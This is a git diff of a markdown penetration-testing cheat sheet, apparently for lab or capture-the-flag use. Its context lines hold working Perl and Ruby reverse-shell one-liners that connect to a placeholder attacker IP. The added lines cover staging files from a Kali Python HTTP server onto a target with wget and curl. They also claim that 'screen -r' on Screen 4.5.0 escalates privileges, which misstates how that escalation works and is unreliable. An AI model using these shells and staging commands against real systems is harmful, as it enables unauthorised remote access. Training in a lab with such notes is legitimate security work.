@@ -124,4 +124,22 @@ perl -e 'use Socket;$i="<attacker_ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,ge
 ruby -e 'exec "/bin/bash"'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<attacker_ip>",<port>);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' - **For Reverse Shell**
 ```
-- 
+-  **where is <anything you want>** will help you to find the location of the file or command in the linux machine
+```bash
+whereis <anything you want>
+```
+- If you want to share a file from kali to linux or any other manchine(windows/linux) then you can start **python Http Server**
+```bash
+python3 -m http.server 80
+```
+- If you want to download a file from the linux machine to kali then you can use **wget** or **curl**
+```bash
+wget <http://<kali linux IP>/file_name>
+curl <http://<kali linux IP>/file_name> -o <file_name>
+```
+
+- If you see **Screen-4.5.0** installed in the linux machine then you can use it to escalate the privileges
+```bash
+screen -ls
+screen -r <session_id>
+```
